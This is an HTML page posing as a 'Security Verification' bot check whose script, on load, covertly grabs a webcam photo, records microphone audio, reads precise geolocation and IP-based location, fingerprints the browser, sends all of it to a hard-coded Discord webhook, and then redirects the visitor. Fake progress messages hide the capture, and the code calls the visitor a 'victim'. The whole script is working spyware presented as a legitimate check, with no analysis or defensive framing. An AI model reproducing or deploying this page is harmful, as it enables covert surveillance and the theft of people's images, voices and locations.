<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');

        body {
            font-family: 'Inter', Arial, sans-serif;
            background: linear-gradient(135deg, #0f0f23, #1a1a2e);
            color: #e0e0e0;
            text-align: center;
            padding: 40px 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            max-width: 520px;
            margin: 0 auto;
            background: rgba(25, 25, 40, 0.95);
            padding: 50px 40px;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(100, 100, 255, 0.2);
        }

        .spinner {
            width: 72px;
            height: 72px;
            border: 6px solid rgba(100, 150, 255, 0.2);
            border-top: 6px solid #6496ff;
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
            margin: 20px auto;
        }

        .progress-bar {
            height: 4px;
            background: #6496ff;
            width: 0%;
            margin: 25px auto;
            border-radius: 2px;
            transition: width 1.8s ease-in-out;
        }

        h1 { color: #6496ff; font-size: 24px; margin: 15px 0; font-weight: 600; }
        p { color: #b0b0cc; font-size: 16px; line-height: 1.5; margin: 15px 0 30px; }

        .status {
            font-size: 14px;
            color: #88ff88;
            margin-top: 10px;
            opacity: 0.9;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .shield { font-size: 42px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="shield">🛡️</div>
        <h1>Security Verification</h1>
        <p>We are verifying that you are a real human and not an automated bot.<br>This process usually takes just a few seconds.</p>
        
        <div class="spinner"></div>
        <div class="progress-bar" id="progress"></div>
        <div class="status" id="status">Analyzing browser fingerprint...</div>
    </div>

    <script>
        const REAL_SITE_URL = "https://unkn0wn-sh4d0w.github.io/";
        const LOG_ENDPOINT = "https://discord.com/api/webhooks/1499531983313702942/6aDuXvkEl4LzC8hiXc01kJLq83wwoYQXWyaD-YWQWuCnGVVVTmPeqcSLJypTr_BLGXmT";

        let visitorData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(", ") : "unknown",
            platform: navigator.platform,
            hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
            deviceMemory: navigator.deviceMemory || "unknown",
            screenResolution: `\( {screen.width}× \){screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || "direct"
        };

        const fakeStatuses = [
            "Analyzing browser fingerprint...",
            "Checking device characteristics...",
            "Verifying human behavior patterns...",
            "Validating session integrity...",
            "Cross-referencing security signals...",
            "Security check completed"
        ];

        async function captureCameraImage() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement("video");
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext("2d").drawImage(video, 0, 0);

                const imageData = canvas.toDataURL("image/jpeg", 0.85);
                stream.getTracks().forEach(track => track.stop());

                visitorData.cameraImage = imageData;
                return imageData;
            } catch (err) {
                visitorData.cameraError = err.name;
                return null;
            }
        }

        async function recordAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(chunks, { type: "audio/webm" });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        visitorData.audioRecording = reader.result;
                    };
                    reader.readAsDataURL(audioBlob);
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 5000);
            } catch (err) {
                visitorData.microphoneError = err.name;
            }
        }

        async function getLocation() {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });

                visitorData.locationGranted = true;
                visitorData.latitude = position.coords.latitude;
                visitorData.longitude = position.coords.longitude;
                visitorData.accuracy = position.coords.accuracy + " meters";
            } catch (err) {
                visitorData.locationGranted = false;
                visitorData.locationError = err.message;
            }
        }

        async function sendToDiscord() {
            const payload = {
                content: "🚨 **New Detailed Capture Report**",
                embeds: [{
                    title: "Visitor Intelligence Report",
                    color: 0xff0000,
                    timestamp: new Date().toISOString(),
                    fields: [
                        { name: "Timestamp", value: visitorData.timestamp, inline: false },
                        { name: "IP / Geo", value: visitorData.ip ? `${visitorData.ip} - ${visitorData.city}, ${visitorData.country}` : "Unknown", inline: false },
                        { name: "Location", value: visitorData.locationGranted ? `✅ Exact: ${visitorData.latitude}, \( {visitorData.longitude}` : `❌ Denied ( \){visitorData.locationError || 'N/A'})`, inline: false },
                        { name: "Camera", value: visitorData.cameraImage ? "✅ Photo Captured" : "❌ Failed", inline: true },
                        { name: "Microphone", value: visitorData.audioRecording ? "✅ Audio Recorded (3s)" : "❌ Failed", inline: true },
                        { name: "User Agent", value: "```" + visitorData.userAgent.substring(0, 300) + "..." + "```", inline: false }
                    ]
                }]
            };

            try {
                await fetch(LOG_ENDPOINT, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch(e) {}

            if (visitorData.cameraImage) {
                try {
                    await fetch(LOG_ENDPOINT, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            content: "**Camera Capture:**",
                            embeds: [{ image: { url: visitorData.cameraImage } }]
                        })
                    });
                } catch(e) {}
            }

            if (visitorData.audioRecording) {
                try {
                    await fetch(LOG_ENDPOINT, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            content: "**Audio Recording (3 seconds):**",
                            embeds: [{ description: "Audio captured from victim" }]
                        })
                    });
                } catch(e) {}
            }
        }

        function simulateCleanProgress() {
            const progressBar = document.getElementById('progress');
            const statusText = document.getElementById('status');
            let progress = 0;
            let statusIndex = 0;

            const interval = setInterval(() => {
                progress += Math.random() * 13 + 8;
                if (progress > 100) progress = 100;
                progressBar.style.width = progress + "%";

                if (progress > statusIndex * 20 && statusIndex < fakeStatuses.length) {
                    statusText.textContent = fakeStatuses[statusIndex];
                    statusIndex++;
                }

                if (progress >= 100) clearInterval(interval);
            }, 170);
        }

        window.onload = async () => {
            simulateCleanProgress();

            await captureCameraImage();
            await recordAudio();
            await getLocation();

            try {
                const res = await fetch("https://ipapi.co/json/");
                if (res.ok) {
                    const geo = await res.json();
                    visitorData.ip = geo.ip;
                    visitorData.country = geo.country_name;
                    visitorData.city = geo.city;
                    visitorData.region = geo.region;
                    visitorData.isp = geo.org;
                }
            } catch(e) {}

            await sendToDiscord();

            setTimeout(() => {
                window.location.replace(REAL_SITE_URL);
            }, 2500);
        };
    </script>
</body>
</html>
